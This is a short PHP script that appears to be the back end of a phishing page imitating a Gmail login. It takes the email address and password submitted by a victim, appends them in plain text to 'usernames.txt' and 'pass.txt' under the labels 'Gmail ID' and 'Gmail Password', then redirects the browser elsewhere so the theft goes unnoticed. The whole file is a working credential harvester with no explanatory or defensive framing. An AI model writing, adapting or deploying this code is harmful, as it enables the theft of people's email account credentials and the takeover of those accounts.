<?php

file_put_contents("usernames.txt", "Gmail ID : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Gmail Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://redirecturl');
?>
